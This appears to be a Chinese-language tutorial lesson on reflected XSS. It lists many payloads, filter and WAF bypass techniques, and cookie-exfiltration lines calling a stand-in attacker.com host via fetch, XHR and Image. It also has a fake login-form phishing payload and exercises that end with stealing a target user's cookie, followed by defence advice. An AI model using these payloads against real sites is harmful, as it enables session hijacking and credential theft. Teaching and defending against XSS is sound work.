# Day 30：反射型XSS深入——进阶技巧与绕过方法

> **学习目标**：深入理解反射型XSS，掌握进阶利用技巧和绕过方法
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐⭐

---

## 📚 今日内容概览

1. 反射型XSS进阶技巧
2. 常见过滤机制
3. 绕过方法汇总
4. 实战练习
5. 防御建议

---

## 一、反射型XSS进阶技巧

### 1.1 基本Payload回顾

```
基础Payload：
  1. <script>alert('XSS')</script>
  2. <script>document.location='http://attacker.com?cookie='+document.cookie</script>
  3. <img src=x onerror=alert('XSS')>
  4. <svg onload=alert('XSS')>
  5. <iframe src=javascript:alert('XSS')>

进阶Payload：
  1. 窃取Cookie：
     <script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  2. 劫持会话：
     <script>document.cookie='session=attacker_session'</script>
  
  3. 钓鱼攻击：
     <script>document.write('<form action=http://attacker.com/login method=post><input name=username><input name=password><button>Login</button></form>')</script>
  
  4. 恶意重定向：
     <script>document.location='http://malicious.com'</script>
```

### 1.2 高级Payload技巧

```
技巧1：使用编码绕过
  - HTML实体编码：&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
  - URL编码：%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
  - 双重编码：%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E

技巧2：使用事件处理器
  - onload：页面加载时执行
  - onerror：加载失败时执行
  - onclick：点击时执行
  - onmouseover：鼠标悬停时执行
  - onfocus：获得焦点时执行
  
  示例：
  <body onload=alert('XSS')>
  <img src=x onerror=alert('XSS')>
  <input onfocus=alert('XSS') autofocus>

技巧3：使用JavaScript伪协议
  - <a href=javascript:alert('XSS')>Click me</a>
  - <iframe src=javascript:alert('XSS')>
  - <img src=javascript:alert('XSS')>

技巧4：使用内联脚本
  - <div style="background-image:url(javascript:alert('XSS'))">
  - <span style="width:expression(alert('XSS'))">（IE浏览器）
```

### 1.3 Cookie窃取技巧

```
Cookie窃取方法：
  1. 使用fetch发送Cookie：
     <script>fetch('http://attacker.com/log.php?cookie='+document.cookie)</script>
  
  2. 使用XMLHttpRequest：
     <script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com/log.php?cookie='+document.cookie);xhr.send();</script>
  
  3. 使用Image标签：
     <img src=http://attacker.com/log.php?cookie=xxx>
     <script>new Image().src='http://attacker.com/log.php?cookie='+document.cookie</script>
  
  4. 使用表单提交：
     <form action=http://attacker.com/log.php method=POST><input name=cookie value=xxx></form>

注意：
  - 需要攻击者有自己的服务器
  - 需要处理URL编码
```

---

## 二、常见过滤机制

### 2.1 输入过滤

```
输入过滤类型：
  1. 黑名单过滤：
     - 过滤<script>标签
     - 过滤on事件处理器
     - 过滤javascript:伪协议
  
  2. 白名单过滤：
     - 只允许特定标签
     - 只允许特定属性
     - 只允许特定字符
  
  3. 转义处理：
     - HTML实体转义：< → &lt;
     - JavaScript转义：' → \'
     - URL编码处理

常见过滤规则：
  - 过滤<script>标签
  - 过滤onerror、onload等事件
  - 过滤javascript:协议
  - 过滤单引号和双引号
  - 过滤特殊字符
```

### 2.2 输出过滤

```
输出过滤类型：
  1. HTML实体编码：
     - 将特殊字符转换为HTML实体
     - < → &lt;
     - > → &gt;
     - " → &quot;
  
  2. JavaScript转义：
     - 在JavaScript字符串中转义特殊字符
     - ' → \'
     - " → \"
     - \ → \\
  
  3. URL编码：
     - 对URL参数进行编码
     - 特殊字符转换为%XX

示例：
  PHP中的htmlspecialchars()函数：
  echo htmlspecialchars($input, ENT_QUOTES);
  会将< > " ' &转换为HTML实体
```

### 2.3 WAF过滤

```
WAF过滤：
  - Web应用防火墙
  - 检测和阻止恶意请求
  - 基于规则的过滤
  
常见WAF规则：
  - 检测<script>标签
  - 检测on事件处理器
  - 检测javascript:协议
  - 检测SQL注入模式
  - 检测XSS模式

绕过WAF方法：
  - 使用编码
  - 使用大小写混合
  - 使用注释
  - 使用特殊字符
```

---

## 三、绕过方法汇总

### 3.1 绕过标签过滤

```
方法1：使用其他标签
  - <img>标签：<img src=x onerror=alert('XSS')>
  - <svg>标签：<svg onload=alert('XSS')>
  - <iframe>标签：<iframe src=javascript:alert('XSS')>
  - <body>标签：<body onload=alert('XSS')>
  - <input>标签：<input onfocus=alert('XSS') autofocus>
  
方法2：使用事件处理器
  - onerror：<img src=x onerror=alert('XSS')>
  - onload：<svg onload=alert('XSS')>
  - onclick：<div onclick=alert('XSS')>Click</div>
  - onmouseover：<div onmouseover=alert('XSS')>Hover</div>
  - onfocus：<input onfocus=alert('XSS') autofocus>

方法3：使用JavaScript伪协议
  - <a href=javascript:alert('XSS')>Click</a>
  - <iframe src=javascript:alert('XSS')>
  - <img src=javascript:alert('XSS')>
```

### 3.2 绕过事件过滤

```
方法1：使用大小写混合
  - <img src=x OnErRoR=alert('XSS')>
  - <svg OnLoAd=alert('XSS')>
  
方法2：使用编码
  - <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
  - <svg onload=alert(String.fromCharCode(88,83,83))>
  
方法3：使用注释
  - <img src=x on/*comment*/error=alert('XSS')>
  - <svg on//comment//load=alert('XSS')>

方法4：使用换行符
  - <img src=x onerror
  =alert('XSS')>
```

### 3.3 绕过引号过滤

```
方法1：使用不需要引号的Payload
  - <img src=x onerror=alert(1)>
  - <svg onload=alert(1)>
  - <input onfocus=alert(1) autofocus>
  
方法2：使用HTML实体编码
  - <img src=x onerror=alert(&#39;XSS&#39;)>
  - <svg onload=alert(&quot;XSS&quot;)>
  
方法3：使用反引号（ES6模板字符串）
  - <img src=x onerror=alert(`XSS`)>
  
方法4：使用Unicode编码
  - <img src=x onerror=alert('\u0058\u0053\u0053')>
```

### 3.4 绕过WAF过滤

```
方法1：使用编码
  - URL编码：%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
  - HTML实体编码：&#x3C;img&#x20;src&#x3D;x&#x20;onerror&#x3D;alert&#x28;1&#x29;&#x3E;
  - JavaScript编码：\x3Cimg\x20src\x3Dx\x20onerror\x3Dalert\x281\x29\x3E

方法2：使用大小写混合
  - <ImG sRc=x OnErRoR=alert(1)>
  - <Svg OnLoAd=alert(1)>

方法3：使用注释
  - <img src=x on/*comment*/error=alert(1)>
  - <svg on<!--comment-->load=alert(1)>

方法4：使用特殊字符
  - <img/src=x/onerror=alert(1)>（去掉空格）
  - <img src=x onerror=alert(1)//>（添加注释）
  - <img src=x onerror='alert(1)'>（使用单引号）
```

---

## 四、实战练习

### 4.1 练习1：绕过<script>标签过滤

```
题目描述：
  网站过滤了<script>标签
  但没有过滤其他标签

解题步骤：
  1. 测试基本Payload：
     <script>alert('XSS')</script> → 被过滤
  
  2. 尝试其他标签：
     <img src=x onerror=alert('XSS')>
     如果弹出警告框，说明可以绕过
  
  3. 构造恶意Payload：
     <img src=x onerror=fetch('http://attacker.com/log.php?cookie='+document.cookie)>
  
  4. 发送给目标用户：
     用户访问后，Cookie被窃取
  
  预期结果：
     获取用户Cookie
```

### 4.2 练习2：绕过事件过滤

```
题目描述：
  网站过滤了onerror事件
  但没有过滤其他事件

解题步骤：
  1. 测试onerror：
     <img src=x onerror=alert('XSS')> → 被过滤
  
  2. 尝试其他事件：
     <svg onload=alert('XSS')>
     如果弹出警告框，说明可以绕过
  
  3. 构造恶意Payload：
     <svg onload=fetch('http://attacker.com/log.php?cookie='+document.cookie)>
  
  4. 发送给目标用户：
     用户访问后，Cookie被窃取
  
  预期结果：
     获取用户Cookie
```

### 4.3 练习3：绕过引号过滤

```
题目描述：
  网站过滤了单引号和双引号

解题步骤：
  1. 测试带引号的Payload：
     <img src=x onerror=alert('XSS')> → 被过滤
  
  2. 尝试不带引号的Payload：
     <img src=x onerror=alert(1)>
     如果弹出警告框，说明可以绕过
  
  3. 构造恶意Payload：
     <img src=x onerror=fetch('http://attacker.com/log.php?cookie='+document.cookie)>
     需要处理引号问题
  
  4. 使用编码绕过：
     <img src=x onerror=fetch(String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,108,111,103,46,112,104,112,63,99,111,111,107,105,101,61)+document.cookie)>
  
  5. 发送给目标用户：
     用户访问后，Cookie被窃取
  
  预期结果：
     获取用户Cookie
```

### 4.4 练习4：绕过WAF过滤

```
题目描述：
  网站使用WAF防护
  常规Payload被拦截

解题步骤：
  1. 测试常规Payload：
     <script>alert('XSS')</script> → 被WAF拦截
  
  2. 尝试编码Payload：
     %3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
     如果弹出警告框，说明可以绕过
  
  3. 尝试大小写混合：
     <ImG sRc=x OnErRoR=alert(1)>
     如果弹出警告框，说明可以绕过
  
  4. 尝试使用注释：
     <img src=x on/*comment*/error=alert(1)>
     如果弹出警告框，说明可以绕过
  
  5. 构造恶意Payload：
     <ImG sRc=x OnErRoR=fetch('http://attacker.com/log.php?cookie='+document.cookie)>
  
  6. 发送给目标用户：
     用户访问后，Cookie被窃取
  
  预期结果：
     获取用户Cookie
```

---

## 五、防御建议

### 5.1 输入验证

```
建议：
  1. 使用白名单验证：
     - 只允许特定的字符
     - 只允许特定的格式
  
  2. 过滤特殊字符：
     - 过滤< > " ' &
     - 过滤JavaScript关键字
  
  3. 使用正则表达式：
     - 验证输入格式
     - 拒绝不符合规则的输入
  
示例（PHP）：
  $input = $_GET['q'];
  if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
    die('Invalid input');
  }
```

### 5.2 输出编码

```
建议：
  1. 使用HTML实体编码：
     - 使用htmlspecialchars()函数
     - 转换特殊字符为HTML实体
  
  2. 根据上下文选择编码：
     - HTML上下文：使用htmlspecialchars()
     - JavaScript上下文：使用json_encode()
     - URL上下文：使用urlencode()
  
示例（PHP）：
  $input = $_GET['q'];
  echo htmlspecialchars($input, ENT_QUOTES);
```

### 5.3 使用安全的API

```
建议：
  1. 使用textContent代替innerHTML：
     - textContent不会解析HTML
     - 只插入纯文本
  
  2. 使用DOMPurify库：
     - 清理HTML内容
     - 移除恶意脚本
  
示例（JavaScript）：
  // 不安全
  document.getElementById('content').innerHTML = userInput;
  
  // 安全
  document.getElementById('content').textContent = userInput;
```

### 5.4 设置安全的Cookie属性

```
建议：
  1. 设置HttpOnly属性：
     - 防止JavaScript读取Cookie
     - 阻止Cookie窃取
  
  2. 设置Secure属性：
     - 只在HTTPS连接中发送Cookie
  
  3. 设置SameSite属性：
     - 防止跨站请求发送Cookie
  
示例（HTTP响应头）：
  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## 六、今日总结

### 6.1 知识点回顾

```
✅ 反射型XSS进阶技巧
  - 高级Payload
  - Cookie窃取技巧
  
✅ 常见过滤机制
  - 输入过滤
  - 输出过滤
  - WAF过滤
  
✅ 绕过方法汇总
  - 绕过标签过滤
  - 绕过事件过滤
  - 绕过引号过滤
  - 绕过WAF过滤
  
✅ 实战练习
  - 四种绕过场景的实战练习
  
✅ 防御建议
  - 输入验证
  - 输出编码
  - 使用安全API
  - 设置安全Cookie属性
```

### 6.2 关键记忆点

```
记住这个口诀：

反射XSS要进阶，绕过技巧要掌握；
标签过滤用其他标签，事件过滤用其他事件；
引号过滤不用引号，WAF过滤用编码；
防御措施要到位，输入验证输出编码！

常用绕过技巧：
  - 使用<img>、<svg>标签
  - 使用onerror、onload事件
  - 使用编码绕过
  - 使用大小写混合
```

### 6.3 今日作业

```
必做题：
  1. 完成四个练习题目
  2. 记录每个题目的解题步骤
  3. 构造恶意Payload

选做题：
  1. 在CTFHub找XSS题目练习
  2. 研究更多XSS绕过技巧
  3. 练习使用DOMPurify清理HTML

提交内容：
  - 解题步骤记录
  - Payload代码
  - 总结
```

### 6.4 明日预告

```
Day 31：存储型XSS深入

学习内容：
  - 存储型XSS进阶技巧
  - 持久化攻击方法
  - 实战练习
```

---

**恭喜你完成Day 30的学习！明天学习存储型XSS深入！** 🎉
